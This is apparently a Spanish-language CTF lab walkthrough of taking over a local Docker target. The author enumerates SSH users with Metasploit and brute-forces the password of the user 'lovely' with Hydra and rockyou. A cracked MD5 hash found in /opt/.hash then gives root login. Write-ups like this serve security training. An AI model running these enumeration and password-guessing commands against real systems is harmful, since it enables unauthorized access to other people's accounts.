
```bash

┌──(root㉿112c1bb279f3)-[/usr/share/wordlists]
└─# searchsploit openssh
----------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                           |  Path
----------------------------------------------------------------------------------------- ---------------------------------
Debian OpenSSH - (Authenticated) Remote SELinux Privilege Escalation                     | linux/remote/6094.txt
Dropbear / OpenSSH Server - 'MAX_UNAUTH_CLIENTS' Denial of Service                       | multiple/dos/1572.pl
FreeBSD OpenSSH 3.5p1 - Remote Command Execution                                         | freebsd/remote/17462.txt
glibc-2.2 / openssh-2.3.0p1 / glibc 2.1.9x - File Read                                   | linux/local/258.sh
Novell Netware 6.5 - OpenSSH Remote Stack Overflow                                       | novell/dos/14866.txt
OpenSSH 1.2 - '.scp' File Create/Overwrite                                               | linux/remote/20253.sh
OpenSSH 2.3 < 7.7 - Username Enumeration                                                 | linux/remote/45233.py
OpenSSH 2.3 < 7.7 - Username Enumeration (PoC)                                           | linux/remote/45210.py
OpenSSH 2.x/3.0.1/3.0.2 - Channel Code Off-by-One                                        | unix/remote/21314.txt
OpenSSH 2.x/3.x - Kerberos 4 TGT/AFS Token Buffer Overflow                               | linux/remote/21402.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (1)                                     | unix/remote/21578.txt
OpenSSH 3.x - Challenge-Response Buffer Overflow (2)                                     | unix/remote/21579.txt
OpenSSH 4.3 p1 - Duplicated Block Remote Denial of Service                               | multiple/dos/2444.sh
OpenSSH 6.8 < 6.9 - 'PTY' Local Privilege Escalation                                     | linux/local/41173.c
OpenSSH 7.2 - Denial of Service                                                          | linux/dos/40888.py
OpenSSH 7.2p1 - (Authenticated) xauth Command Injection                                  | multiple/remote/39569.py
OpenSSH 7.2p2 - Username Enumeration                                                     | linux/remote/40136.py
OpenSSH < 6.6 SFTP (x64) - Command Execution                                             | linux_x86-64/remote/45000.c
OpenSSH < 6.6 SFTP - Command Execution                                                   | linux/remote/45001.py
OpenSSH < 7.4 - 'UsePrivilegeSeparation Disabled' Forwarded Unix Domain Sockets Privileg | linux/local/40962.txt
OpenSSH < 7.4 - agent Protocol Arbitrary Library Loading                                 | linux/remote/40963.txt
OpenSSH < 7.7 - User Enumeration (2)                                                     | linux/remote/45939.py
OpenSSH SCP Client - Write Arbitrary Files                                               | multiple/remote/46516.py
OpenSSH/PAM 3.6.1p1 - 'gossh.sh' Remote Users Ident                                      | linux/remote/26.sh
OpenSSH/PAM 3.6.1p1 - Remote Users Discovery Tool                                        | linux/remote/25.c
OpenSSHd 7.2p2 - Username Enumeration                                                    | linux/remote/40113.txt
Portable OpenSSH 3.6.1p-PAM/4.1-SuSE - Timing Attack                                     | multiple/remote/3303.sh
----------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(root㉿112c1bb279f3)-[/usr/share/wordlists]
└─# 
```

Tenemos que tiene una vulnerabilidad de enumeracion de usuarios si buscamos en ExploitDB, con lo que lanzare un modulo de metasploit

```bash
msf6 > search ssh enum

Matching Modules
================

   #  Name                                           Disclosure Date  Rank    Check  Description
   -  ----                                           ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/cerberus_sftp_enumusers  2014-05-27       normal  No     Cerberus FTP Server SFTP Username Enumeration
   1  auxiliary/scanner/http/gitlab_user_enum        2014-11-21       normal  No     GitLab User Enumeration
   2  post/linux/gather/enum_network                 .                normal  No     Linux Gather Network Information
   3  post/windows/gather/enum_putty_saved_sessions  .                normal  No     PuTTY Saved Sessions Enumeration Module
   4  auxiliary/scanner/ssh/ssh_enumusers            .                normal  No     SSH Username Enumeration
   5    \_ action: Malformed Packet                  .                .       .      Use a malformed packet
   6    \_ action: Timing Attack                     .                .       .      Use a timing attack
   7  auxiliary/scanner/ssh/ssh_enum_git_keys        .                normal  No     Test SSH Github Access


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/ssh/ssh_enum_git_keys

msf6 > use 4
[*] Using action Malformed Packet - view all 2 actions with the show actions command
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set RHOST 172.17.0.3
RHOST => 172.17.0.3
msf6 auxiliary(scanner/ssh/ssh_enumusers) > options

Module options (auxiliary/scanner/ssh/ssh_enumusers):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CHECK_FALSE   true             no        Check for false positives (random username)
   DB_ALL_USERS  false            no        Add all users in the current database to the list
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        172.17.0.3       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/bas
                                            ics/using-metasploit.html
   RPORT         22               yes       The target port
   THREADS       1                yes       The number of concurrent threads (max one per host)
   THRESHOLD     10               yes       Amount of seconds needed before a user is considered found (timing attack onl
                                            y)
   USERNAME                       no        Single username to test (username spray)
   USER_FILE                      no        File containing usernames, one per line


Auxiliary action:

   Name              Description
   ----              -----------
   Malformed Packet  Use a malformed packet



View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/seclists/
Discovery         Miscellaneous     Pattern-Matching  README.md         Web-Shells        
Fuzzing           Passwords         Payloads          Usernames         
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/seclists/Discovery/
DNS             File-System     Infrastructure  Mainframe       SNMP            Variables       Web-Content
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/seclists/Usernames/
CommonAdminBase64.txt                   cirt-default-usernames.txt              xato-net-10-million-usernames-dup.txt
Honeypot-Captures                       mssql-usernames-nansh0u-guardicore.txt  xato-net-10-million-usernames.txt
Names                                   sap-default-usernames.txt               
README.md                               top-usernames-shortlist.txt             
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/seclists/Usernames/xato-net-10-million-usernames
xato-net-10-million-usernames-dup.txt  xato-net-10-million-usernames.txt      
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/seclists/Usernames/xato-net-10-million-usernames
xato-net-10-million-usernames-dup.txt  xato-net-10-million-usernames.txt      
msf6 auxiliary(scanner/ssh/ssh_enumusers) > set USER_FILE /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
USER_FILE => /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
msf6 auxiliary(scanner/ssh/ssh_enumusers) > exploit
[*] 172.17.0.3:22 - SSH - Using malformed packet technique
[*] 172.17.0.3:22 - SSH - Checking for false positives
[*] 172.17.0.3:22 - SSH - Starting scan
[+] 172.17.0.3:22 - SSH - User 'mail' found
[+] 172.17.0.3:22 - SSH - User 'root' found
[+] 172.17.0.3:22 - SSH - User 'news' found
[+] 172.17.0.3:22 - SSH - User 'man' found
[+] 172.17.0.3:22 - SSH - User 'bin' found
[+] 172.17.0.3:22 - SSH - User 'games' found
[+] 172.17.0.3:22 - SSH - User 'nobody' found
[+] 172.17.0.3:22 - SSH - User 'lovely' found
```

Haber si podemos sacar el usuario lovely con rockyou y hydra

```bash

┌──(root㉿112c1bb279f3)-[/usr/share/wordlists]
└─# hydra -l lovely -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.3 -t 10 -I
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-05 08:29:06
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 10 tasks per 1 server, overall 10 tasks, 14344399 login tries (l:1/p:14344399), ~1434440 tries per task
[DATA] attacking ssh://172.17.0.3:22/
[22][ssh] host: 172.17.0.3   login: lovely   password: rockyou
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-05 08:29:09
```

```bash
┌──(root㉿112c1bb279f3)-[/usr/share/wordlists]
└─# ssh lovely@172.17.0.3
The authenticity of host '172.17.0.3 (172.17.0.3)' cant be established.
ED25519 key fingerprint is SHA256:U6y+etRI+fVmMxDTwFTSDrZCoIl2xG/Ur/6R0cQMamQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.3' (ED25519) to the list of known hosts.
lovely@172.17.0.3s password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
lovely@16bd8b9af3f8:~$ # From public github
```

Ahora que estamos dentro de la maquina deberemos de intentar buscar alguna vulnerabilidad para hacer una escalada de privilegios, para ello ya que no puedo utilizar las herramientas tipicas como `curl`, `wget`, o `git` para descargar scripts, ejecutare un `find / -type f -perm -600` para ver si tengo algun fichero programa con al menos permisos de escritura y lectura

`/opt/.hash`

Encuentro un fichero anomalo dentro del sistema, vamos ha hechar un vistazo que contiene ese fichero, ya que no es muy usual ver un fichero con ese nombre dentro de la carpeta /opt

```bash
lovely@c0fe5493a0e1:~$ cat /opt/.hash            
aa87ddc5b4c24406d26ddad771ef44b0
lovely@c0fe5493a0e1:~$ 
```

Tenemos un hash, voy a pasarlo por crackstation para ver que contiene el hash.

|   |   |   |
|---|---|---|
|aa87ddc5b4c24406d26ddad771ef44b0|md5|estrella|O
Obtenemos una palabra, vamos a probar para entrar como root usando esa contraseña

```bash
┌──(root㉿112c1bb279f3)-[/]
└─# ssh root@172.17.0.3
root@172.17.0.3s password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@c0fe5493a0e1:~# ls
root@c0fe5493a0e1:~# 
```

Ya somos root de la maquina